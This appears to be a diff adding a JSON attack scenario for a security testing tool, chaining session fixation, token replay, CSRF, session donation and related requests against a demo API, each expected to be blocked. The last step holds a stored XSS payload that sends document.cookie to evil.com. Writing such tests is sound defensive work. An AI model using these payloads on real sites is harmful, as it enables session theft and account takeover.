@@ -1,0 +1,248 @@
+{
+  "id": "api-demo-session-hijacking",
+  "name": "Chimera Session Hijacking & Fixation",
+  "category": "Session Management",
+  "difficulty": "Advanced",
+  "description": "Comprehensive session management attacks including hijacking, fixation, and token manipulation",
+  "steps": [
+    {
+      "id": "session-enum-cookies",
+      "name": "Session Cookie Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/auth/status",
+        "headers": {
+          "Cookie": "sessionid=predictable_session_12345; csrftoken=weak_token"
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "session-fixation-attempt",
+      "name": "Session Fixation Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json",
+          "Cookie": "sessionid=FIXED_SESSION_ID_123"
+        },
+        "body": {
+          "username": "victim@example.com",
+          "password": "password123"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "session-enum-cookies"
+      ]
+    },
+    {
+      "id": "concurrent-session-abuse",
+      "name": "Concurrent Session Creation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "10.0.0.1, 10.0.0.2, 10.0.0.3"
+        },
+        "body": {
+          "username": "user@example.com",
+          "password": "password",
+          "session_count": 100
+        }
+      },
+      "execution": {
+        "delayMs": 300
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "session-fixation-attempt"
+      ]
+    },
+    {
+      "id": "token-replay-stale",
+      "name": "Stale Token Replay",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/products/search?q=laptop",
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDAwMDAwMDB9.stale_token"
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "concurrent-session-abuse"
+      ]
+    },
+    {
+      "id": "session-puzzling",
+      "name": "Session Puzzling Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/forgot",
+        "headers": {
+          "Content-Type": "application/json",
+          "Cookie": "admin_session=active; user_session=victim"
+        },
+        "body": {
+          "email": "admin@target.com",
+          "reset_session": true
+        }
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "token-replay-stale"
+      ]
+    },
+    {
+      "id": "csrf-token-bypass",
+      "name": "CSRF Token Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/cart/add",
+        "headers": {
+          "Content-Type": "application/json",
+          "Origin": "https://evil.com",
+          "X-CSRF-Token": "invalid_or_missing"
+        },
+        "body": {
+          "product_id": "EXPENSIVE-ITEM",
+          "quantity": 10
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "session-puzzling"
+      ]
+    },
+    {
+      "id": "token-sidejacking",
+      "name": "Token Sidejacking via Referer",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/vendors/financial/export",
+        "headers": {
+          "Referer": "https://evil.com?token=stolen_jwt_token",
+          "Authorization": "Bearer stolen_jwt_token_from_logs"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "csrf-token-bypass"
+      ]
+    },
+    {
+      "id": "session-donation",
+      "name": "Session Donation Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/transfer",
+        "headers": {
+          "Content-Type": "application/json",
+          "Cookie": "sessionid=attacker_session"
+        },
+        "body": {
+          "transfer_to": "victim@example.com",
+          "session_data": "malicious_state"
+        }
+      },
+      "execution": {
+        "delayMs": 700
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "token-sidejacking"
+      ]
+    },
+    {
+      "id": "logout-csrf",
+      "name": "Logout CSRF Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/logout",
+        "headers": {
+          "Origin": "https://malicious.site",
+          "Cookie": "sessionid=victim_session"
+        }
+      },
+      "execution": {
+        "delayMs": 400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "session-donation"
+      ]
+    },
+    {
+      "id": "persistent-xss-session",
+      "name": "Session Theft via Stored XSS",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/reviews/submit",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer {{token}}"
+        },
+        "body": {
+          "product_id": "PRODUCT-001",
+          "rating": 5,
+          "review": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
+        }
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "logout-csrf"
+      ]
+    }
+  ]
+}
